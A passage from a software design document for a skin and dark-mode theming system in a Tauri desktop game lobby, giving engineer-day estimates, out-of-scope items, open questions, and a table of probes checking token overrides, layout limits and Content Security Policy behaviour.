engine either Tauri backend can use. If Linux ever ships, test `color-mix()`
first and consider relaxing.

---

## 9. Scope and estimate

Engineer-days, for someone who has read this document. Assumes the existing
conventions are followed (pure functions plus a `#[tauri::command]`, as in
`engine_settings.rs`; a `--check` script wired into `npm test`, as in
`gen-icons.mjs`).

### MVP — "the app has a dark mode, and the mechanism is the real one"

Ships bundled skins only. No disk loading, no user-authored skins.

| Work | Days |
|---|---|
| Token allowlist + tier table + value grammar as data (`src/theme/tokens.json`), derived from the read set | 0.5 |
| `src/theme/skin.ts`: validate → clamp → serialise → inject one `<style>`; synchronous boot from `localStorage` so there is no flash | 0.5 |
| `settings.ts`: `skin` field, persisted, plus the cached resolved CSS | 0.5 |
| Settings screen: picker, live switching, warning list | 0.5 |
| **Design and ship the `Ink` dark skin** — this is design iteration, not typing | 1.5 |
| The `MapImage` two-token fix: request upstream, re-sync, re-apply the three vendor patches, verify (§3.4a, §6.3) | 1 |
| Contrast checker + Tier D collision rules, as a tested pure function | 1 |
| Safe mode: a documented way back from a skin that hides the UI (proposal: `Ctrl+Shift+R` resets to default, plus skipping the skin if a launch flag is set) | 0.5 |
| `tools/gen-tokens.mjs --check` wired into `npm test` (§6.2) | 0.5 |
| e2e: assert a skin applies, that the app still renders every screen under it, and that no skin can set a Tier C token | 0.5 |
| **Total** | **7** |

### Full feature — user-installable skins

| Work | Days |
|---|---|
| MVP | 7 |
| `src-tauri/src/skins.rs`: resolve the skins dir, list, read, size cap, malformed-file handling + Rust unit tests | 1.5 |
| IPC command, TS side, store, error surfacing in Settings, "open skins folder" | 1 |
| Manifest schema versioning and forward compatibility (unknown tokens ignored with a warning, never a hard fail) | 0.5 |
| Author documentation + a fully-commented template skin + the contrast checker as a CLI | 1 |
| Live token editor in Settings — the thing that actually causes skins to exist | 2–3 |
| Import via file picker (dialog plugin + capability entry) | 1 |
| A second first-party skin proving the system on something that is not just "dark" (high-contrast, or a warm-paper variant) | 1 |
| **Total** | **15–16** |

Roughly one and a half weeks for a real dark mode, three weeks for a skin
ecosystem. The estimate risk is concentrated in two rows: designing `Ink` (a
design task with no fixed endpoint) and the live editor.

### Deliberately not in scope

- **Layout skinning.** §2.2 Tier C. Not a phase-two item — a permanent no.
- **Per-screen or per-component skinning.** Requires selectors the DS does not
  emit (§1.2) and would not survive a re-sync.
- **Custom fonts inside skins.** Blocked by `font-src 'self'` (§7.2). Revisit
  only as a deliberate CSP decision.
- **A skin gallery, ratings, or in-app download.** §7.4 stage 4.
- **Animated or scripted skins.** §7.1.
- **Skinning the map imagery treatment beyond the two tokens in §3.4.** The
  imagery is server-supplied art; the protection gradient is what makes text on
  it legible, and it is not a taste surface.

### The anti-goal risk, since it is not a scope line

DESIGN_HANDOFF §3 names two anti-goals: generic dark-mode SaaS, and sci-fi
cliché. Those are precisely the two skins the community will make first. A skin
system does not cause that — but it does mean the screenshots players post may
not show Shiro's design, which cuts against the stated goal of a lobby "a player
would screenshot and post".

The mitigation is not prohibition. It is: (1) the default stays the default and
stays excellent; (2) ship a genuinely good dark skin so nobody has to make a bad
one, which is the single highest-value item in the MVP table; (3) keep Tier C
locked, so a skin can recolour Shiro but cannot un-densify it — the density and
the hairline structure are the design, and they are exactly what a skin cannot
reach.

---

## 10. Open questions — ordered by what it costs to get them wrong

1. **Do the two `MapImage` tokens go upstream before skins ship publicly?**
   (§3.4) Highest cost by a distance. If third-party dark skins exist first,
   each will have worked around the white letterbox differently and the proper
   fix breaks all of them. Everything else here is reversible; this is not.

2. **Is a skin ever allowed to be raw CSS?** (§1.4) The answer must be decided
   before the first skin is published, because narrowing later breaks the
   community's work. The evidence in §1.2 says the extra power is nearly
   theoretical and the extra risk is not.

3. **Do faction and presence colours move, and under what rule?** (§4) A wrong
   answer makes protocol state unreadable rather than ugly, and the failure is
   invisible to the skin author who has 20/20 vision and a bright monitor. The
   hue-window rule in §4.3 is a proposal; it has not been prototyped.

4. **Is "follow the OS" a skin, a setting, or nothing?** The app ignores
   `prefers-color-scheme` today. If it becomes a setting, it sits *above* the
   skin picker (two skins, one per scheme), which changes the settings model and
   the persistence shape. Cheap to decide now, annoying to retrofit.

5. **Does the design project want to own the dark palette?** (§6) If yes, `Ink`
   becomes a second token set mirrored from upstream like the light one, and
   re-syncs cover both. If no, it is a skin file in this repo and can drift from
   the design system. Affects §6.2's drift check.

6. **Does Linux ever ship?** (§8) It is not a target today. If it becomes one,
   test `color-mix()` before deciding whether skin manifests may carry
   expressions rather than literals.

7. **Hard reject or warn on contrast?** (§5) Warning is recommended, partly
   because a hard WCAG AA gate would reject Shiro's own `--text-faint`. Worth
   confirming that the owner is comfortable shipping a skin the app itself
   flagged.

8. **Does the skins folder get watched, or is a restart acceptable?** Purely an
   authoring-comfort question. Cheap either way; listed last for that reason.

---

## 11. What was checked, and how

All probes ran on 2026-08-18 from
`AppData\Local\Temp\claude\…\scratchpad\` — outside the repo, nothing added to
the tree. They can be reconstructed from the descriptions below; none of them
contacted the Zero-K server (`App.jsx` uses `src/data.js` whenever
`inTauri()` is false, and `window.__TAURI_INTERNALS__` was confirmed absent).

| Probe | Target | What it established |
|---|---|---|
| `skin-probe.mjs` | `npm run dev`, battle list, demo data | Token overrides reach inline styles; the two dark-skin experiments in §3.1 and §3.2, with computed values and screenshots; the contrast table in §5 |
| `csp-probe.mjs` | `dist/` served with the packaged CSP | Inline `<style>` works; `data:`/`blob:`/remote `<link>` all blocked; remote image and remote font blocked (§7.2) |
| `csp-probe2.mjs` | same | `data:` images allowed, `data:` fonts blocked (§7.2) |
| `csp-probe3.mjs` | same | `@import` blocked for both `data:` and remote, tested at the top of the sheet so rule-ordering does not confound it |
| `layout-probe.mjs` | `npm run dev`, 1280×720 | The Tier C evidence in §2.1 — 15 token abuses, overflow and clipping measured |
| in-page evaluation | `npm run dev` | The class-hook census in §1.2; plain rule vs `!important` against an inline declaration |
| `grep`/`node` over the tree | working tree | 146 tokens, 30 unread; zero token definitions in `src/ds/shiro.js` or `vendor/_ds_bundle.js`; the `--ink-000` and `--white` consumer tables in §3.3; the contrast arithmetic in §4.2 |

**Not checked, and flagged as such:** anything about WebKitGTK (§8); the
behaviour of these mechanisms inside the real Tauri WebView2 shell as opposed to
Edge with the same CSP — the CSP probe explicitly cannot test the `ipc:` scheme,
per the note in `serve-csp.mjs`; and the hue-window rule proposed in §4.3, which
is a design proposal and has not been prototyped against real faction marks.
